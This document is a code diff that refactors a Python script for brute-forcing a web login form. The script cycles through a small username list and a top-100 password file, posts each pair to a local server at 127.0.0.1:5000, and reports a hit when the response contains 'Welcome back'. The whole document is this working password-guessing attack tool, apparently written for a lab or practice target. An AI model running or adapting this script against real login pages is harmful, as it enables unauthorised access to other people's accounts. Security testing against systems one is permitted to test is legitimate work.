@@ -1,22 +1,38 @@
 import requests
 import sys
 
-target = "http://127.0.0.1:5000"
-username = ["admin", "user", "test"]
-passwords = "top-100.txt"
-needle = "Welcome back"
+# Configuration
+target_url = "http://127.0.0.1:5000"
+usernames = ["admin", "user", "test"]
+password_file = "top-100.txt"
+success_message = "Welcome back"
 
-for username in username:
-	with open(passwords, "r") as passwords_lists:
-		for password in passwords_lists:
-			passwords = password.strip("\n").encode()
-			sys.stdout.write("[X] Attempting user:password -> {}:{}\r".format(username, password.decode()))
-			r = requests.post(target, data={"username": username, "password": password})
-			if needle.encode() in r.content:
-				sys.stdout.write("\n")
-				sys.stdout.write("\t[>>>>>] Valid password '{} found for user '{}'!".format(password.decode(), username))
-				sys.exit()
-			sys.stdout.flush()
-			sys.stdout.write("\n")
-			sys.stdout.write("\tNo password found for for user '{}'!".format(username))
-			sys.stdout.write("\n")
+def attempt_login(username, password):
+    """Attempts to log in with the given username and password."""
+    response = requests.post(target_url, data={"username": username, "password": password})
+    return success_message in response.text
+
+def main():
+    try:
+        with open(password_file, "r") as file:
+            passwords = [line.strip() for line in file]
+
+        for username in usernames:
+            print(f"[*] Testing passwords for user: {username}")
+            for password in passwords:
+                sys.stdout.write(f"[X] Attempting user:password -> {username}:{password}\r")
+                sys.stdout.flush()
+
+                if attempt_login(username, password):
+                    print(f"\n[>>>>>] Valid password '{password}' found for user '{username}'!")
+                    return
+
+            print(f"\n[!] No valid password found for user '{username}'.")
+
+    except FileNotFoundError:
+        print(f"[Error] Password file '{password_file}' not found.")
+    except requests.RequestException as e:
+        print(f"[Error] Request failed: {e}")
+
+if __name__ == "__main__":
+    main()
